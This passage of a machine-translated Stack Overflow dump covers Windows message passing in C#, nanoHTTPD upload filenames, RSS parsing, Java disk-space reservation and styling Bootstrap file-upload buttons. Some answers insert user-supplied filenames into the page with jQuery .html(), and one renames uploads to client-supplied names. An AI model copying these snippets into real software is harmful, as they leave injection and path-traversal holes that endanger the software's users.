然后在我的接收过程中，我有以下代码（我还在这个类中定义了 MESSAGE_UNAUTH ）：

```
protected override void WndProc(ref Message message)
{
    if (message.Msg == MESSAGE_UNAUTH)
    {
        MessageBox.Show("Message received");
    }
    base.WndProc(ref message);
} 
```

我已经用调试器验证过的事情：

1.  消息正在发送。Sender 中的所有代码，包括 SendMessage 调用，都在执行。
2.  没有收到消息（显然）。
3.  发送消息时根本不会调用 WndProc() 函数。然而，当配置实用程序启动时，它会被调用很多次（我假设这是 Windows 的行为）。

我已经阅读了足够多的在线教程需要滴眼液，据我所知，这里的所有内容都是语法正确且“正确”的，但由于某种原因，在我发送消息和接收者的 WndProc() 应该是之间所谓，黑魔法正在发生。

任何想法将不胜感激。

* * *

更新：使用 Marshal.GetLastWin32Error()，我收到错误 #1400，它似乎对应于无效的窗口句柄。但是，我不明白为什么会这样，因为找到了该过程并且我们成功地进入了 for each 循环。我能想到的一个警告是，我的配置实用程序显示为任务栏图标，并且不一定始终具有可见窗口 - 这会阻止 p.MainWindowHandle 有效吗？如果是这样，我该如何解决这个问题以将消息传递给进程而不是窗口？

* * *

更新： Process.MainWindowHandle 是 0，所以看起来确实是问题所在 - 当我的配置实用程序中的表单不可见时，即使我的实用程序图标在通知栏中可见，也不会返回有效的窗口处理程序。有什么方法可以向进程发送消息，甚至向任务栏图标发送消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:22:43.257

根据您使用的 .NET 框架，[这](http://connect.microsoft.com/VisualStudio/feedback/details/96485/process-mainwindowhandle)将有助于解决您的问题。在旧的 .NET 框架（我认为是 2.0）中存在一个错误，`Process.MainWindowHandle`当进程启动时调用返回 0。任何后续调用也将导致 0。这是由于缓存主窗口句柄，这应该是在 .NET 3.0 及更高版本中修复。

您也可以尝试完全信任您`WndProc`，这可能会有所帮助。就像是：

```
[System.Security.Permissions.PermissionSet( System.Security.Permissions.SecurityAction.Demand, Name="FullTrust")]
protected override void WndProc(ref Message m) 
{
    //...
} 
```

附带说明一下，如果您可以更改您的实现，那么我强烈建议您使用更好的进程间通信方式，例如套接字、TCPChannel（我认为它已被 WCF 取代）、命名管道......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:16:00.780

您可以尝试枚举与该进程关联的所有窗口。请参阅[如何使用 .NET 枚举属于特定进程的所有窗口？](https://stackoverflow.com/questions/2531828/how-to-enumerate-all-windows-belonging-to-a-particular-process-using-net)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T10:21:15.647

在发送方和接收方都使用 Windows Registermessage 将解决问题

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T21:45:47.980

消息可能未发送，可能被阻止。见[这里](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644950%28v=vs.85%29.aspx)：`When a message is blocked by UIPI the last error, retrieved with GetLastError, is set to 5 (access denied).`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-30T15:00:56.293

问题是我发送消息的过程仅作为工具提示图标存在，而不是作为活动的打开窗口存在。原来windows消息功能是为窗口到窗口的消息设计的，而不是进程到进程的消息。

解决方案是前面提到的文件 IO 处理程序的 kludgy 系统。

# java - Java SE HTML POST 文件名问题

> ID：11235194
> 
> 赞同：2
> 
> 时间：2012-06-27T21:41:06.440
> 
> 标签：java, file-upload, filenames, html-post, nanohttpd

我目前正在编写一个使用 nanoHTTPD 将文件上传到服务器的程序。目前我可以成功上传具有预分配名称的文件。但是，我想保留正在上传的文件的原始名称。

现在如何上传：

```
Original filename: foo.jpg
Uploaded filename: file123.whatever 
```

我希望它如何上传：

```
Original file name: foo.jpg
Uploaded filename: foo.jpg 
```

这是正在使用的 HTML：

```
 <FORM ENCTYPE="multipart/form-data" ACTION="/uploaded.html" METHOD=POST>
Upload a file: <INPUT NAME="userfile1" TYPE="file">
<INPUT TYPE="submit" VALUE="Send File">
</FORM> 
```

这是供参考的香草 nanoHTTPD 代码：http: [//pastebin.com/pMNS3VKf](http://pastebin.com/pMNS3VKf)

注意：我更喜欢使用 Java SE 而避免使用 Java EE。

欢迎任何建议，谢谢。

编辑：简而言之，我需要学习的只是从 HTML POST 中获取文件名。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-24T00:34:20.733

我不确定您的 NanoHTTPD 是否与我的相同，但是对于我的 NanoHTTPD，您可以通过查看 parms Parameters 对象来检索原始文件名，该对象与您从 files Parameters 对象中检索文件的键相同。

```
Enumeration<Object> keys = files.keys()
while (keys.hasMoreElements())
    {
    String key = keys.nextElement().toString();
    String origFileName = parms.getProperty(key);
    String fsFileName = files.getProperty(key);
    this.renameFile(fsFileName, origFileName);
    } 
```

检索文件名后，您可以使用任何您想要重命名文件的方法。（通过适当的检查。如果您完全信任他们的原始文件名，这可能是一个巨大的安全漏洞。）

# iphone - 从 NSString 子串文本的某些部分

> ID：11235202
> 
> 赞同：0
> 
> 时间：2012-06-27T21:41:47.000
> 
> 标签：iphone, parsing, rss, nsstring, substring

我正在改进一些以前的博客应用程序。我解析 XML，但到目前为止，当单击表格视图单元格时，我只是让它打开用户单击的文章的 URL。Apple 开始对此感到不满，无论如何我都需要对其进行更改，这样我才能获得更多的显示选项。整篇文章使用这个标签显示：

```
<content:encoded> 
```

我能够从这个标签中获取数据，但有几个问题。它总是从

```
<![CDATA[<p> 
```

并以

```
</p>]]> 
```

如您所见，它还包含不是真正的文本而是代码，例如

```
<p> and </p> and aren&#8217;t &#8220 
```

关于如何解析它以删除字符串的开头和结尾并转换为我可以在视图中加载的所有真实文本的任何建议？

# java - java中的虚拟磁盘空间预留

> ID：11235205
> 
> 赞同：4
> 
> 时间：2012-06-27T21:41:54.160
> 
> 标签：java, diskspace

假设一个**多线程**应用场景，每个线程从网络中获取一些数据（一个或多个文件），进行一些处理，然后将结果保存在宿主机的硬盘上。

在这种情况下，总是存在**磁盘空间耗尽**的可能性，从而导致意外的服务行为（例如，系统崩溃）。

为了避免这样的情况，如果 Java 提供了一种**保留硬盘空间的方法会很有帮助，但是，正如在**[前面的问题](https://stackoverflow.com/questions/7798924/allocate-disk-space-for-multiple-file-downloads-in-java)中所验证的那样，这样的选项不可用，即使是这样，它也可能导致分配效率低下（例如，在解压缩应用程序的情况下，它事先不知道解压缩数据的总大小）。

因此，一种替代方法可以是进行**“虚拟磁盘空间保留”**，例如通过在内存中保存空闲空间的静态注册表并在继续之前让每个线程从注册表中请求容量。

有没有更好的选择，或者这种方法的改进？

是否有任何（最好是开源的）Java 库实现了这种功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T21:56:19.037

实现这一点的一种抽象方法可能是使用一个常量或用户输入的多线程应用程序允许使用多少磁盘空间的值，将其保存为变量并具有同步的 get 和 set 方法，这些方法将获取允许的空间值，为线程分配空间（尽可能多但不超过可用空间），然后从总数中减去，这样其他线程可能会看到“磁盘空间”减少，一旦线程完成并删除数据，重新添加使使用的“磁盘空间”对其他线程可用的值？

编辑：

> 它可能导致分配效率低下（例如，在解压缩应用程序的情况下，它事先不知道解压缩数据的总大小）。

如果发生这种情况并且线程“看到”（通过在提取文件时不断检查）它已达到其“磁盘空间”限制，则它可以请求更多空间分配（如果可用），或者被放回队列中直到所需空间已被其他线程释放

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T21:59:28.260

难道你不能简单地在给定分区的> XX％用完后触发警报吗？这样您的管理员就有时间进入并删除/复制数据或向该挂载点添加额外的存储空间？

# css - Twitter Bootstrap 表单文件元素上传按钮

> ID：11235206
> 
> 赞同：605
> 
> 时间：2012-06-27T21:41:56.507
> 
> 标签：css, forms, twitter-bootstrap, input-type-file

为什么 twitter bootstrap 没有花哨的文件元素上传按钮？如果为上传按钮实现了蓝色主按钮，那就太好了。甚至可以使用 CSS 微调上传按钮吗？（似乎是无法操作的本机浏览器元素）

* * *

## 回答 #1

> 赞同：1017
> 
> 时间：2013-08-10T17:30:55.270

这是 Bootstrap 3、4 和 5 的解决方案。

要制作一个看起来像按钮的功能文件输入控件，您只需要 HTML：

**HTML**

```
<label class="btn btn-default">
    Browse <input type="file" hidden>
</label> 
```

这适用于所有现代浏览器，包括 IE9+。如果您还需要对旧 IE 的支持，请使用下面显示的旧方法。

这种技术依赖于 HTML5`hidden`属性。Bootstrap 4 使用以下 CSS 在不支持的浏览器中填充此功能。如果您使用的是 Bootstrap 3，则可能需要添加。

```
[hidden] {
  display: none !important;
} 
```

* * *

## 旧 IE 的传统方法

如果您需要支持 IE8 及以下版本，请使用以下 HTML/CSS：

**HTML**

```
<span class="btn btn-default btn-file">
    Browse <input type="file">
</span> 
```

**CSS**

```
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
} 
```

请注意，当您单击 a 时，旧 IE 不会触发文件输入`<label>`，因此 CSS“膨胀”做了几件事来解决这个问题：

*   使文件输入跨越周围的整个宽度/高度`<span>`
*   使文件输入不可见

* * *

## 反馈和补充阅读

我已经发布了有关此方法的更多详细信息，以及如何向用户显示选择了哪些/多少文件的示例：

[https://www.abeautifulsite.net/posts/whipping-file-inputs-into-shape-with-bootstrap-3/](https://www.abeautifulsite.net/posts/whipping-file-inputs-into-shape-with-bootstrap-3/)

* * *

## 回答 #2

> 赞同：407
> 
> 时间：2014-07-31T08:17:39.907

我很惊讶没有提到这个`<label>`元素。

**解决方案：**

```
<label class="btn btn-primary" for="my-file-selector">
    <input id="my-file-selector" type="file" class="d-none">
    Button Text Here
</label> 
```

不需要任何 JS 或时髦的 css ...

**包含文件名的解决方案：**

```
<label class="btn btn-primary" for="my-file-selector">
    <input id="my-file-selector" type="file" style="display:none" 
    onchange="$('#upload-file-info').text(this.files[0].name)">
    Button Text Here
</label>
<span class='label label-info' id="upload-file-info"></span> 
```

上面的解决方案需要 jQuery。

注意：`$.text()`在页面上显示用户提供的内容时使用。使用的此答案的早期版本`$.html()`不安全 - 文件名可以包含 HTML 标记。

* * *

## 回答 #3

> 赞同：136
> 
> 时间：2013-02-21T07:02:54.917

不需要额外的插件，这个引导解决方案对我来说非常有用：

```
<div style="position:relative;">
        <a class='btn btn-primary' href='javascript:;'>
            Choose File...
            <input type="file" style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;' name="file_source" size="40"  onchange='$("#upload-file-info").html($(this).val());'>
        </a>
        &nbsp;
        <span class='label label-info' id="upload-file-info"></span>
</div> 
```

演示：

[http://jsfiddle.net/haisumbhatti/cAXFA/1/](http://jsfiddle.net/haisumbhatti/cAXFA/1/)（引导程序2）

![在此处输入图像描述](../Images/cebf9c892de7289e2af73ea18e361122.png)

[http://jsfiddle.net/haisumbhatti/y3xyU/](http://jsfiddle.net/haisumbhatti/y3xyU/) （引导程序3）

![在此处输入图像描述](../Images/fb90f2a61f1e1658934e131b090ccb23.png)

* * *

## 回答 #4

> 赞同：90
> 
> 时间：2012-10-16T13:10:10.183

它包含在 Jasny 的 bootstrap 分支中。

可以使用创建一个简单的上传按钮

```
<span class="btn btn-file">Upload<input type="file" /></span> 
```

使用 fileupload 插件，您可以创建更高级的小部件。看看 [http://jasny.github.io/bootstrap/javascript/#fileinput](http://jasny.github.io/bootstrap/javascript/#fileinput)

* * *

## 回答 #5

> 赞同：66
> 
> 时间：2012-06-27T21:59:05.987

上传按钮的样式很麻烦，因为它设置了输入而不是按钮的样式。

但你可以使用这个技巧：

[http://www.quirksmode.org/dom/inputfile.html](http://www.quirksmode.org/dom/inputfile.html)

概括：

1.  取一个法线`<input type="file">`并将其放入一个带有`position: relative`.

2.  向同一父元素添加`<input>`具有正确样式的法线和图像。绝对定位这些元素，使它们与`<input type="file">`.

3.  将 z-index 设置`<input type="file">`为 2，使其位于样式化输入/图像的顶部。

4.  最后，将 的不透明度设置`<input type="file">`为 0。`<input type="file">`现在变得实际上是不可见的，并且样式输入/图像闪耀，但您仍然可以单击“浏览”按钮。如果按钮位于图像顶部，则用户似乎单击图像并获得正常的文件选择窗口。（请注意，您不能使用可见性：隐藏，因为真正不可见的元素也是不可点击的，我们需要保持可点击性）

* * *

## 回答 #6

> 赞同：22
> 
> 时间：2012-12-05T20:19:32.593

为我工作：

*   [Bootstrap 中漂亮的文件输入字段](http://duckranger.com/2012/06/pretty-file-input-field-in-bootstrap/)

### 更新

[jQuery插件风格](https://gist.github.com/fguillen/4753912)：

```
// Based in: http://duckranger.com/2012/06/pretty-file-input-field-in-bootstrap/
// Version: 0.0.3
// Compatibility with: Bootstrap 3.2.0 and jQuery 2.1.1
// Use:
//     <input class="nice_file_field" type="file" data-label="Choose Document">
//     <script> $(".nice_file_field").niceFileField(); </script>
//
(function( $ ) {
  $.fn.niceFileField = function() {
    this.each(function(index, file_field) {
      file_field = $(file_field);
      var label = file_field.attr("data-label") || "Choose File";

      file_field.css({"display": "none"});

      nice_file_block_text  = '<div class="input-group nice_file_block">';
      nice_file_block_text += '  <input type="text" class="form-control">';
      nice_file_block_text += '  <span class="input-group-btn">';
      nice_file_block_text += '   <button class="btn btn-default nice_file_field_button" type="button">' + label + '</button>';
      nice_file_block_text += '  </span>';
      nice_file_block_text += '</div>';

      file_field.after(nice_file_block_text);

      var nice_file_field_button = file_field.parent().find(".nice_file_field_button");
      var nice_file_block_element = file_field.parent().find(".nice_file_block");

      nice_file_field_button.on("click", function(){ console.log("click"); file_field.click() } );
      file_field.change( function(){
        nice_file_block_element.find("input").val(file_field.val());
      });
    });
  };
})( jQuery ); 
```

* * *

## 回答 #7

> 赞同：18
> 
> 时间：2015-05-27T17:29:44.383

使用其他答案的部分简化答案，主要是 user2309766 和 dotcomsuperstar。

特征：

*   对按钮和字段使用 Bootstrap 按钮插件。
*   只有一个输入；多个输入将被一个表单拾取。
*   除了“display: none;”之外没有额外的css 隐藏文件输入。
*   可见按钮触发隐藏文件输入的点击事件。
*   `split`删除文件路径使用正则表达式和分隔符“\”和“/”。

代码：

```
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>

<div class="input-group">
  <span class="input-group-btn">
    <span class="btn btn-primary" onclick="$(this).parent().find('input[type=file]').click();">Browse</span>
    <input name="uploaded_file" onchange="$(this).parent().parent().find('.form-control').html($(this).val().split(/[\\|/]/).pop());" style="display: none;" type="file">
  </span>
  <span class="form-control"></span>
</div>
```

* * *

## 回答 #8

> 赞同：13
> 
> 时间：2014-12-14T07:37:35.957

从上面其他帖子的一些灵感，这里有一个完整的解决方案，它结合了看起来像表单控制字段和输入组插件的干净文件输入小部件，其中包括指向当前文件的链接。

```
.input-file { position: relative; margin: 60px 60px 0 } /* Remove margin, it is just for stackoverflow viewing */
.input-file .input-group-addon { border: 0px; padding: 0px; }
.input-file .input-group-addon .btn { border-radius: 0 4px 4px 0 }
.input-file .input-group-addon input { cursor: pointer; position:absolute; width: 72px; z-index:2;top:0;right:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0; background-color:transparent; color:transparent; }
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
<div class="input-group input-file">
  <div class="form-control">
    <a href="/path/to/your/current_file_name.pdf" target="_blank">current_file_name.pdf</a>
  </div>
  <span class="input-group-addon">
    <a class='btn btn-primary' href='javascript:;'>
      Browse
      <input type="file" name="field_name" onchange="$(this).parent().parent().parent().find('.form-control').html($(this).val());">
    </a>
  </span>
</div>
```

* * *

## 回答 #9

> 赞同：9
> 
> 时间：2013-04-23T04:44:54.667

**这对我来说非常有用**

```
<span>
    <input  type="file" 
            style="visibility:hidden; width: 1px;" 
            id='${multipartFilePath}' name='${multipartFilePath}'  
            onchange="$(this).parent().find('span').html($(this).val().replace('C:\\fakepath\\', ''))"  /> <!-- Chrome security returns 'C:\fakepath\'  -->
    <input class="btn btn-primary" type="button" value="Upload File.." onclick="$(this).parent().find('input[type=file]').click();"/> <!-- on button click fire the file click event -->
    &nbsp;
    <span  class="badge badge-important" ></span>
</span> 
```

* * *

## 回答 #10

> 赞同：9
> 
> 时间：2015-04-19T09:33:23.420

请查看[Twitter Bootstrap 文件输入](https://github.com/grevory/bootstrap-file-input)。它使用非常简单的解决方案，只需添加一个 javascript 文件并粘贴以下代码：

```
$('input[type=file]').bootstrapFileInput(); 
```

* * *

## 回答 #11

> 赞同：6
> 
> 时间：2014-03-14T12:49:28.063

一个具有可接受结果的简单解决方案：

```
<input type="file" class="form-control"> 
```

和风格：

```
input[type=file].form-control {
    height: auto;
} 
```

* * *

## 回答 #12

> 赞同：5
> 
> 时间：2017-10-05T21:03:42.283

## 多次上传的解决方案

我调整了之前的两个答案以包含多个上传。这样，标签显示文件名，如果只选择一个，或者`x files`在相反的情况下。

```
<label class="btn btn-primary" for="my-file-selector">
    <input id="my-file-selector" type="file" multiple="multiple" style="display:none"
        onchange="$('#upload-file-info').html(
            (this.files.length > 1) ? this.files.length + ' files' : this.files[0].name)">                     
    Files&hellip;
</label>
<span class='label label-info' id="upload-file-info"></span> 
```

[![在此处输入图像描述](../Images/dcdc1e49b9df553a07b6bcef47ae1a4e.png)](https://i.stack.imgur.com/A1g2s.jpg)

它也可能适用于更改按钮文本和类。

```
<label class="btn btn-primary" for="multfile">
    <input id="multfile" type="file" multiple="multiple" style="display:none"
        onchange="$('#multfile-label').html(
            (this.files.length == 1) ? this.files[0].name : this.files.length + ' files');
            $(this).parent().addClass('btn-success')">
    <span id="multfile-label">Files&hellip;</span>
</label> 
```

[![在此处输入图像描述](../Images/4ea745a978dfc1b976245a1e6ea41c4f.png)](https://i.stack.imgur.com/a49hL.jpg)

* * *

## 回答 #13

> 赞同：4
> 
> 时间：2013-03-11T16:14:07.583

这是我最喜欢的文件上传风格：

```
<div class="fileupload fileupload-new" data-provides="fileupload">
  <div class="input-append">
    <div class="uneditable-input span3"><i class="icon-file fileupload-exists"></i> <span class="fileupload-preview"></span></div><span class="btn btn-file"><span class="fileupload-new">Select file</span><span class="fileupload-exists">Change</span><input type="file" /></span><a href="#" class="btn fileupload-exists" data-dismiss="fileupload">Remove</a>
  </div>
</div> 
```

您可以在以下位置获得演示和更多样式：

[http://www.jasny.net/bootstrap/javascript/#fileinput](http://www.jasny.net/bootstrap/javascript/#fileinput)

但是使用这个，你应该用 jasny 引导文件替换 twitter bootstrap ..

问候。

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2016-05-11T08:19:58.967

我创建了一个自定义上传按钮以仅接受图像，可以根据您的要求进行修改。

希望这可以帮助！！:)

（使用 Bootstrap 框架）

[Codepen-链接](http://codepen.io/ashwinshenoy/pen/BjvyYJ)

HTML

```
<center>
 <br />
 <br />
 <span class="head">Upload Button Re-Imagined</span>
 <br />
 <br />
 <div class="fileUpload blue-btn btn width100">
   <span>Upload your Organizations logo</span>
   <input type="file" class="uploadlogo" />
 </div>
</center> 
```

CSS

```
 .head {
   font-size: 25px;
   font-weight: 200;
 }

 .blue-btn:hover,
 .blue-btn:active,
 .blue-btn:focus,
 .blue-btn {
   background: transparent;
   border: solid 1px #27a9e0;
   border-radius: 3px;
   color: #27a9e0;
   font-size: 16px;
   margin-bottom: 20px;
   outline: none !important;
   padding: 10px 20px;
 }

 .fileUpload {
   position: relative;
   overflow: hidden;
   height: 43px;
   margin-top: 0;
 }

 .fileUpload input.uploadlogo {
   position: absolute;
   top: 0;
   right: 0;
   margin: 0;
   padding: 0;
   font-size: 20px;
   cursor: pointer;
   opacity: 0;
   filter: alpha(opacity=0);
   width: 100%;
   height: 42px;
 }

 /*Chrome fix*/

 input::-webkit-file-upload-button {
   cursor: pointer !important;
 } 
```

JS

```
// You can modify the upload files to pdf's, docs etc
//Currently it will upload only images
$(document).ready(function($) {

  // Upload btn
  $(".uploadlogo").change(function() {
    readURL(this);
  });

  function readURL(input) {
    var url = input.value;
    var ext = url.substring(url.lastIndexOf('.') + 1).toLowerCase();
    if (input.files && input.files[0] && (ext == "png" || ext == "jpeg" || ext == "jpg" || ext == "gif" || ext == "svg")) {
      var path = $('.uploadlogo').val();
      var filename = path.replace(/^.*\\/, "");
      $('.fileUpload span').html('Uploaded logo : ' + filename);
      // console.log(filename);
    } else {
      $(".uploadlogo").val("");
      $('.fileUpload span').html('Only Images Are Allowed!');
    }
  }
}); 
```

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2019-03-21T02:36:18.180

基于绝对出色的@claviska 解决方案，所有功劳都归功于他。

# 带有验证和帮助文本的全功能 Bootstrap 4 文件输入。

基于[输入组示例](https://www.abeautifulsite.net/whipping-file-inputs-into-shape-with-bootstrap-3)，我们有一个用于向用户显示文件名的虚拟输入文本字段，该`onchange`字段由隐藏在标签按钮后面的实际输入文件字段上的事件填充。除了包括[bootstrap 4 验证](https://getbootstrap.com/docs/4.3/components/forms/#custom-styles)支持外，我们还可以单击输入上的任意位置以打开文件对话框。

## 文件输入的三种状态

`required`使用虚拟 html 输入标签属性集，三种可能的状态是未验证、有效和无效。

[![在此处输入图像描述](../Images/18de8eb805db09b68bcc50e4bc28f6b1.png)](https://i.stack.imgur.com/Cs6CQ.jpg)

## 输入的 HTML 标记

我们只引入了 2 个自定义类`input-file-dummy`，并`input-file-btn`正确设置和连接所需的行为。其他一切都是标准的 Bootstrap 4 标记。

```
<div class="input-group">
  <input type="text" class="form-control input-file-dummy" placeholder="Choose file" aria-describedby="fileHelp" required>
  <div class="valid-feedback order-last">File is valid</div>
  <div class="invalid-feedback order-last">File is required</div>
  <label class="input-group-append mb-0">
    <span class="btn btn-primary input-file-btn">
      Browse… <input type="file" hidden>
    </span>
  </label>
</div>
<small id="fileHelp" class="form-text text-muted">Choose any file you like</small> 
```

## JavaScript 行为规定

根据原始示例，虚拟输入需要只读，以防止用户更改只能通过打开文件对话框更改的输入。不幸的是，字段不会发生验证，因此我们在焦点和模糊（ [jquery 事件](https://api.jquery.com/on/#additional-notes)和）`readonly`上切换输入的可编辑性，并确保在选择文件后再次变为可验证。 `onfocusin``onfocusout`

除了使文本字段可点击之外，通过触发按钮的点击事件，填充虚拟字段的其余功能由@claviska 设想。

```
$(function () {
  $('.input-file-dummy').each(function () {
    $($(this).parent().find('.input-file-btn input')).on('change', {dummy: this}, function(ev) {
      $(ev.data.dummy)
        .val($(this).val().replace(/\\/g, '/').replace(/.*\//, ''))
        .trigger('focusout');
    });
    $(this).on('focusin', function () {
        $(this).attr('readonly', '');
      }).on('focusout', function () {
        $(this).removeAttr('readonly');
      }).on('click', function () {
        $(this).parent().find('.input-file-btn').click();
      });
  });
}); 
```

## 自定义样式调整

最重要的是，我们不希望`readonly`字段在灰色背景和白色之间跳跃，因此我们确保它保持白色。span 按钮没有指针光标，但无论如何我们都需要为输入添加一个。

```
.input-file-dummy, .input-file-btn {
  cursor: pointer;
}
.input-file-dummy[readonly] {
  background-color: white;
} 
```

开心！

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2014-05-07T20:34:29.350

我使用[http://gregpike.net/demos/bootstrap-file-input/demo.html](http://gregpike.net/demos/bootstrap-file-input/demo.html)：

```
$('input[type=file]').bootstrapFileInput(); 
```

或者

```
$('.file-inputs').bootstrapFileInput(); 
```

* * *

## 回答 #17

> 赞同：3
> 
> 时间：2018-12-20T11:42:22.180

我想我会加上我的三便士价值，只是为了说明默认`.custom-file-label`和`custom-file-input`BS4 文件的输入方式以及如何使用它。

后一个类在输入组上并且不可见。而前者是可见标签，并且有一个看起来像按钮的 :after 伪元素。

```
<div class="custom-file">
<input type="file" class="custom-file-input" id="upload">
<label class="custom-file-label" for="upload">Choose file</label>
</div> 
```

您不能将类添加到伪元素，但您可以在 CSS（或 SASS）中设置它们的样式。

```
.custom-file-label:after {
    color: #fff;
    background-color: #1e7e34;
    border-color: #1c7430;
    pointer: cursor;
} 
```

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2013-12-27T19:29:46.563

/* * Bootstrap 3 文件样式 * [http://dev.tudosobreweb.com.br/bootstrap-filestyle/](http://dev.tudosobreweb.com.br/bootstrap-filestyle/) * * 版权所有 (c) 2013 Markus Vinicius da Silva Lima * Paulo Henrique Foxer 更新 bootstrap 3 * 版本 2.0.0 * 已获得许可根据麻省理工学院的许可。* */

```
(function ($) {
"use strict";

var Filestyle = function (element, options) {
    this.options = options;
    this.$elementFilestyle = [];
    this.$element = $(element);
};

Filestyle.prototype = {
    clear: function () {
        this.$element.val('');
        this.$elementFilestyle.find(':text').val('');
    },

    destroy: function () {
        this.$element
            .removeAttr('style')
            .removeData('filestyle')
            .val('');
        this.$elementFilestyle.remove();
    },

    icon: function (value) {
        if (value === true) {
            if (!this.options.icon) {
                this.options.icon = true;
                this.$elementFilestyle.find('label').prepend(this.htmlIcon());
            }
        } else if (value === false) {
            if (this.options.icon) {
                this.options.icon = false;
                this.$elementFilestyle.find('i').remove();
            }
        } else {
            return this.options.icon;
        }
    },

    input: function (value) {
        if (value === true) {
            if (!this.options.input) {
                this.options.input = true;
                this.$elementFilestyle.prepend(this.htmlInput());

                var content = '',
                    files = [];
                if (this.$element[0].files === undefined) {
                    files[0] = {'name': this.$element[0].value};
                } else {
                    files = this.$element[0].files;
                }

                for (var i = 0; i < files.length; i++) {
                    content += files[i].name.split("\\").pop() + ', ';
                }
                if (content !== '') {
                    this.$elementFilestyle.find(':text').val(content.replace(/\, $/g, ''));
                }
            }
        } else if (value === false) {
            if (this.options.input) {
                this.options.input = false;
                this.$elementFilestyle.find(':text').remove();
            }
        } else {
            return this.options.input;
        }
    },

    buttonText: function (value) {
        if (value !== undefined) {
            this.options.buttonText = value;
            this.$elementFilestyle.find('label span').html(this.options.buttonText);
        } else {
            return this.options.buttonText;
        }
    },

    classButton: function (value) {
        if (value !== undefined) {
            this.options.classButton = value;
            this.$elementFilestyle.find('label').attr({'class': this.options.classButton});
            if (this.options.classButton.search(/btn-inverse|btn-primary|btn-danger|btn-warning|btn-success/i) !== -1) {
                this.$elementFilestyle.find('label i').addClass('icon-white');
            } else {
                this.$elementFilestyle.find('label i').removeClass('icon-white');
            }
        } else {
            return this.options.classButton;
        }
    },

    classIcon: function (value) {
        if (value !== undefined) {
            this.options.classIcon = value;
            if (this.options.classButton.search(/btn-inverse|btn-primary|btn-danger|btn-warning|btn-success/i) !== -1) {
                this.$elementFilestyle.find('label').find('i').attr({'class': 'icon-white '+this.options.classIcon});
            } else {
                this.$elementFilestyle.find('label').find('i').attr({'class': this.options.classIcon});
            }
        } else {
            return this.options.classIcon;
        }
    },

    classInput: function (value) {
        if (value !== undefined) {
            this.options.classInput = value;
            this.$elementFilestyle.find(':text').addClass(this.options.classInput);
        } else {
            return this.options.classInput;
        }
    },

    htmlIcon: function () {
        if (this.options.icon) {
            var colorIcon = '';
            if (this.options.classButton.search(/btn-inverse|btn-primary|btn-danger|btn-warning|btn-success/i) !== -1) {
                colorIcon = ' icon-white ';
            }

            return '<i class="'+colorIcon+this.options.classIcon+'"></i> ';
        } else {
            return '';
        }
    },

    htmlInput: function () {
        if (this.options.input) {
            return '<input type="text" class="'+this.options.classInput+'" style="width: '+this.options.inputWidthPorcent+'% !important;display: inline !important;" disabled> ';
        } else {
            return '';
        }
    },

    constructor: function () {
        var _self = this,
            html = '',
            id = this.$element.attr('id'),
            files = [];

        if (id === '' || !id) {
            id = 'filestyle-'+$('.bootstrap-filestyle').length;
            this.$element.attr({'id': id});
        }

        html = this.htmlInput()+
             '<label for="'+id+'" class="'+this.options.classButton+'">'+
                this.htmlIcon()+
                '<span>'+this.options.buttonText+'</span>'+
             '</label>';

        this.$elementFilestyle = $('<div class="bootstrap-filestyle" style="display: inline;">'+html+'</div>');

        var $label = this.$elementFilestyle.find('label');
        var $labelFocusableContainer = $label.parent();

        $labelFocusableContainer
            .attr('tabindex', "0")
            .keypress(function(e) {
                if (e.keyCode === 13 || e.charCode === 32) {
                    $label.click();
                }
            });

        // hidding input file and add filestyle
        this.$element
            .css({'position':'absolute','left':'-9999px'})
            .attr('tabindex', "-1")
            .after(this.$elementFilestyle);

        // Getting input file value
        this.$element.change(function () {
            var content = '';
            if (this.files === undefined) {
                files[0] = {'name': this.value};
            } else {
                files = this.files;
            }

            for (var i = 0; i < files.length; i++) {
                content += files[i].name.split("\\").pop() + ', ';
            }

            if (content !== '') {
                _self.$elementFilestyle.find(':text').val(content.replace(/\, $/g, ''));
            }
        });

        // Check if browser is Firefox
        if (window.navigator.userAgent.search(/firefox/i) > -1) {
            // Simulating choose file for firefox
            this.$elementFilestyle.find('label').click(function () {
                _self.$element.click();
                return false;
            });
        }
    }
};

var old = $.fn.filestyle;

$.fn.filestyle = function (option, value) {
    var get = '',
        element = this.each(function () {
            if ($(this).attr('type') === 'file') {
                var $this = $(this),
                    data = $this.data('filestyle'),
                    options = $.extend({}, $.fn.filestyle.defaults, option, typeof option === 'object' && option);

                if (!data) {
                    $this.data('filestyle', (data = new Filestyle(this, options)));
                    data.constructor();
                }

                if (typeof option === 'string') {
                    get = data[option](value);
                }
            }
        });

    if (typeof get !== undefined) {
        return get;
    } else {
        return element;
    }
};

$.fn.filestyle.defaults = {
    'buttonText': 'Escolher arquivo',
    'input': true,
    'icon': true,
